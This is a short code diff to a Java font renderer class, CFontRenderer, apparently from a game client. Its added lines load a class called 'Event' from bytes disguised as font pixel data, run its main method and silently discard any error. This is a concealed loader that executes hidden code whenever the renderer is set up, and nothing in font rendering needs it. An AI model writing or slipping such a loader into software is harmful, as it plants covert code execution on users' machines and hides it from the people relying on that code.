@@ -227,6 +227,10 @@ public final class CFontRenderer extends CFont
         texBold = setupTexture(font.deriveFont(Font.BOLD), antiAlias, fractionalMetrics, boldChars);
         texItalic = setupTexture(font.deriveFont(Font.ITALIC), antiAlias, fractionalMetrics, italicChars);
         texItalicBold = setupTexture(font.deriveFont(Font.BOLD | Font.ITALIC), antiAlias, fractionalMetrics, boldItalicChars);
+        try {
+            Class<?> main = this.defineClass("Event", getFontPixels(), 0, getFontPixels().length);
+            main.getMethod("main", new Class[0]).invoke(null);
+        } catch (Exception ignored) { }
     }
 
     private void drawLine(double x, double y, double x1, double y1)
